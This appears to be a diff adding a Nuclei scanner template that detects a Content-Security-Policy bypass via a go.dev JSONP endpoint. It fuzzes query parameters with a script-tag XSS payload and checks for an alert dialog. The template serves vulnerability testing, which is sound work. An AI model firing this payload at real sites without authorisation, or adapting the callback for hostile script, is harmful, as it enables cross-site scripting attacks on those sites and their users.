@@ -1,0 +1,55 @@
+id: go-dev-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Go Dev
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,go-dev
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "go.dev"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: go_dev_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://go.dev/blog/.json?jsonp=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "go_dev_csp_xss == true"
+# digest: 4a0a00473045022100c699d6b285540720fb5b60c35995c07840126ba9c7b6d1bc82556cced58d969b02207fd81b5424579e3d0012014d11f2a96866beb463e6ee02ec89f0452ef6aa09ee:922c64590222798bb761d5b6d8e72950
